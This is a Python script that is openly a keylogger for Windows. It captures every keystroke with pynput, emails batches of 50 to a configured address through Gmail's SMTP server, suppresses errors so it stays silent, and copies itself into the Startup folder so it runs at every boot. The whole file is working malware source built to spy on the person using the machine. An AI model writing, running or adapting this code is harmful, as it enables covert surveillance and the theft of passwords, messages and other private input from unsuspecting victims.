import os
import shutil
import smtplib
import time
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Email setup
EMAIL_ADDRESS = 'your_email@gmail.com'  # Replace with your Gmail
EMAIL_PASSWORD = 'your_app_password'    # Replace with your app password (SMTP key)
TO_EMAIL = 'recipient_email@gmail.com'  # The email to send logs to

log_file = os.path.join(os.getenv('APPDATA'), 'system_log.txt')  # Log file path
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

# Initialize buffer to store keystrokes
keystroke_buffer = []
BUFFER_LIMIT = 50  # Max number of keystrokes before sending an email
TIME_LIMIT = 300  # Time limit in seconds (5 minutes)

# Function to send email with buffered log data
def send_email():
    try:
        log_data = ''.join(keystroke_buffer)
        if log_data:  # Only send email if there is data to send
            # Set up the MIME structure for the email
            msg = MIMEMultipart()
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = TO_EMAIL
            msg['Subject'] = 'Keylogger Log'
            msg.attach(MIMEText(log_data, 'plain'))

            # Set up the SMTP server and send the email
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            server.quit()

            # Clear the keystroke buffer after sending
            keystroke_buffer.clear()
    except Exception:
        # Suppress errors to avoid crashing
        pass

# Function to capture keystrokes
def on_press(key):
    global keystroke_buffer
    try:
        keystroke_buffer.append(str(key.char))  # Add character to buffer
    except AttributeError:
        keystroke_buffer.append(f' [{key}] ')  # Add special key to buffer

    # If buffer limit is reached, send an email
    if len(keystroke_buffer) >= BUFFER_LIMIT:
        send_email()

# Function to ensure the script runs on startup
def copy_to_startup():
    # Copy the executable script to the startup folder
    script_path = os.path.abspath(__file__)  # Current Python script's location
    startup_executable_path = os.path.join(startup_folder, 'keylogger.exe')

    # Check if the executable already exists in the startup folder
    if not os.path.exists(startup_executable_path):
        shutil.copy(script_path, startup_executable_path)

# Function to log until shutdown or exit
def start_keylogger():
    # Start keylogger listener
    with Listener(on_press=on_press) as listener:
        listener.join()

# Main execution
if __name__ == "__main__":
    # Ensure the script copies itself to startup folder
    copy_to_startup()

    # Start capturing keystrokes
    start_keylogger()
